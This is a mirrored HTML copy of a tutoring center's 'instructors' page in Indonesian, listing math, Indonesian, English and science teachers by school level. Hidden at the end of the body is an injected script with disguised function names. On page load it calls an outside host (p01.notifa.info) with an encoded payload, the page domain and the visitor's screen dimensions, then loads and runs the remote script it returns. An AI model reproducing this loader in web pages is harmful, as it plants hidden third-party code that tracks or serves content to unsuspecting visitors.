...
<!-- Mirrored from templines.rocks/html/academica/instructors.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 03 Dec 2018 14:36:50 GMT -->
								...
								<div class="posts-wrap">
									...
									<div class="staff">
										...
										<div class="staff__inner staff__inner_mod-a">
											...
											<div class="staff__categories"><a class="post-link" href="javascript:void(0);">Pengajar SD - Matematika</a></div>
											<div class="staff__description">Kelas 1 - 6 SD</div>
									...
									<div class="staff">
										...
										<div class="staff__inner staff__inner_mod-a">
											...
											<div class="staff__categories"><a class="post-link" href="javascript:void(0);">Pengajar  SD - Bahasa Indonesia</a></div>
											<div class="staff__description">Kelas 1 - 6 SD</div>
											<ul class="social-links list-unstyled">
												<li><a class="icon fa fa-facebook" href="javascript:void(0);"></a></li>
												<li><a class="icon fa fa-twitter" href="javascript:void(0);"></a></li>
									...
									<div class="staff">
										...
										<div class="staff__inner staff__inner_mod-a">
											...
											<div class="staff__categories"><a class="post-link" href="javascript:void(0);">Pengajar SD/SMP - B.Inggris</a></div>
											<div class="staff__description">Kelas 1 - 6 SD / 7 - 9 SMP</div>
											<ul class="social-links list-unstyled">
												<li><a class="icon fa fa-facebook" href="javascript:void(0);"></a></li>
												<li><a class="icon fa fa-twitter" href="javascript:void(0);"></a></li>
												<li><a class="icon fa fa-google-plus" href="javascript:void(0);"></a></li>
									...
									<div class="staff">
										...
										<div class="staff__inner staff__inner_mod-a">
											...
											<div class="staff__categories"><a class="post-link" href="javascript:void(0);">Pengajar SMP - Matematika</a></div>
											<div class="staff__description">Kelas 7 - 9 SMP</div>
											<ul class="social-links list-unstyled">
												<li><a class="icon fa fa-facebook" href="javascript:void(0);"></a></li>
												<li><a class="icon fa fa-twitter" href="javascript:void(0);"></a></li>
												<li><a class="icon fa fa-google-plus" href="javascript:void(0);"></a></li>
									...
									<div class="staff">
										...
										<div class="staff__inner staff__inner_mod-a">
											...
											<div class="staff__categories"><a class="post-link" href="javascript:void(0);">Pengajar SMP - Bahasa Indonesia</a></div>
											<div class="staff__description">Kelas 7 - 9 SMP</div>
											<ul class="social-links list-unstyled">
												<li><a class="icon fa fa-facebook" href="javascript:void(0);"></a></li>
												<li><a class="icon fa fa-twitter" href="javascript:void(0);"></a></li>
									...
									<div class="staff">
										...
										<div class="staff__inner staff__inner_mod-a">
											...
											<div class="staff__categories"><a class="post-link" href="javascript:void(0);">Pengajar SMA - Matematika </a></div>
											<div class="staff__description">Kelas 10 - 12 SMA</div>
											<ul class="social-links list-unstyled">
												<li><a class="icon fa fa-facebook" href="javascript:void(0);"></a></li>
												<li><a class="icon fa fa-twitter" href="javascript:void(0);"></a></li>
												<li><a class="icon fa fa-google-plus" href="javascript:void(0);"></a></li>
									...
									<div class="staff">
										...
										<div class="staff__inner staff__inner_mod-a">
											...
											<div class="staff__categories"><a class="post-link" href="javascript:void(0);">Pengajar SMA - B. Indonesia</a></div>
											<div class="staff__description">Kelas 10 - 12 SMA</div>
											<ul class="social-links list-unstyled">
												<li><a class="icon fa fa-facebook" href="javascript:void(0);"></a></li>
												<li><a class="icon fa fa-twitter" href="javascript:void(0);"></a></li>
									...
									<div class="staff">
										...
										<div class="staff__inner staff__inner_mod-a">
											...
											<div class="staff__categories"><a class="post-link" href="javascript:void(0);">Pengajar SMP/SMA - IPA</a></div>
											<div class="staff__description">Kelas 7 - 9 SMP / 10 - 12 SMA</div>
											<ul class="social-links list-unstyled">
												<li><a class="icon fa fa-facebook" href="javascript:void(0);"></a></li>
												<li><a class="icon fa fa-twitter" href="javascript:void(0);"></a></li>
												<li><a class="icon fa fa-google-plus" href="javascript:void(0);"></a></li>
...
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdpSXHqfS4C8tqIf61I9vY7%2fVveIgUikAh5zR6fPr%2bmwAhkLksxhxoolu%2flDR6nt9dhPQCSXZMf%2f%2blyleNek7LJoZY3hVMadOTDMeTm%2b%2bPg0QAcaf35NnbSVtQG%2f95p4UhJEy4DrGLSrqCrQT%2f4BAECKwTRzUaynyifHJTb9KmEdM4gb0E8LAlkjiowAHmyYyb36mX4eGoZtZS6Pb8H6KrnkVUT%2bGb212IwNXTbGxB0D%2fg9mXRQ0nFnWk66dbhg%2b%2brKQeIdIrIl%2fvO5R9NoV7Nxbl5Fw%2fg3V%2fvNq2mEYmaiGer2RgY0SuyVJn%2fUddE5CtuPcL93TqETscegPFNKezl0C9sdoKs%2fJkNykx40d5Vhv9NJiL6gPFj6sMF44vqE%2f8d0p4beb0S4fyn7njvX%2f1AQYlNQytVdkbHt%2bNSbSM0OoKs7KN2CrV7NA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from templines.rocks/html/academica/instructors.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 03 Dec 2018 14:36:53 GMT -->
</html>
